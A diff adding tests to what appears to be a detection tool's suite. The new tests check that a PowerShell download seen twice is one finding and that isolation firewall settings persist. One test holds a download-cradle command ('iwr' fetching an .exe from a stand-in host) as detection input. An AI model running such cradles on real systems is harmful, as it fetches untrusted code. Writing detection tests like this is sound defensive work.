@@ -289,6 +289,19 @@ def test_the_same_download_is_the_same_finding():
     assert other[0]["id"] != download_findings(events, [], [], FLOWS, {4812})[0]["id"]
 
 
+def test_one_cradle_seen_as_a_command_line_and_a_script_block_is_one_finding():
+    url = "http://a.b/x.exe"
+    command = proc(4812, t=2, cmd=f'powershell -c "iwr {url} -o x.exe"')
+    block = ps(f"iwr {url} -o x.exe", pid=4812, t=3)
+    found = download_findings([block], [command], [], FLOWS, {4812})
+    assert len(found) == 1
+    assert found[0]["source"] == "sysmon" and found[0]["sources"] == ["powershell", "sysmon"]
+    assert found[0]["observed_at"] == "2026-11-14T10:00:02.000Z"                     # the earliest event
+    assert found[0]["id"] == download_findings([block], [], [], FLOWS, {4812})[0]["id"]   # whichever came first
+    other = download_findings([ps(f"iwr {url}", pid=4999)], [], [], [flow(pid=4999)], {4999})
+    assert other[0]["id"] != found[0]["id"]                                        # another process is another finding
+
+
 def test_the_extension_is_read_from_the_path_in_any_case():
     def urls(*found):
         return download_findings([ps(" ".join(found))], [], [], FLOWS, {4812})
@@ -622,9 +635,24 @@ def test_settings_keep_the_way_back_for_isolated(tmp_path):
     again = Settings(path)
     assert (again.isolated, again.outbound_before, again.isolated_since) == (True, "NotConfigured", 1_700_000_000.5)
     assert again.as_dict() == {"ask_mode": "detonation", "isolated": True, "outbound_before": "NotConfigured",
-                               "isolated_since": 1_700_000_000.5}
+                               "isolated_since": 1_700_000_000.5, "allow_disabled": []}
     again.set(isolated=False, outbound_before=None, isolated_since=None)
     assert Settings(path).as_dict() == Settings.DEFAULTS
+
+
+def test_settings_keep_the_windows_rules_isolated_switched_off(tmp_path):
+    path = str(tmp_path / "state.json")
+    s = Settings(path)
+    s.set(allow_disabled=["CoreNet-DNS-Out-UDP", "{1234}"])
+    assert Settings(path).allow_disabled == ["CoreNet-DNS-Out-UDP", "{1234}"]
+    for bad in ("CoreNet", [""], [5], None):
+        with pytest.raises(ValueError):
+            s.set(allow_disabled=bad)
+    with open(path, "w", encoding="utf-8") as f:
+        json.dump({"allow_disabled": "nope"}, f)
+    damaged = Settings(path)
+    assert damaged.allow_disabled == [] and damaged.load_error
+    assert Settings.DEFAULTS["allow_disabled"] == []
 
 
 def test_settings_refuse_wrong_values_and_change_nothing(tmp_path):
